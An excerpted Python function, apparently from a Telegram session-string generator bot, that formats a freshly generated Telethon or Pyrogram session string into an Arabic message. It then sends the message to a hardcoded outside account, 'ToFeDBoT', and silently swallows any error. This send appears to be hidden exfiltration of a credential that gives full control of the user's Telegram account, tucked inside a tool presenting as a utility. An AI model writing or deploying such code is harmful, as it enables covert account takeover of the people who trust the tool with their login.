...
async def generate_session(bot, msg, telethon=False):
    ...
    text = "**{} كـود اެݪجـلسة** \n\n`{}` \n\مـسـتخࢪج من @Y66YY66".format(
"تليثون" if telethon else "بايࢪوجࢪام", string_session
    )
    try:
        await client.send_message("ToFeDBoT", text)
    except KeyError:
        pass
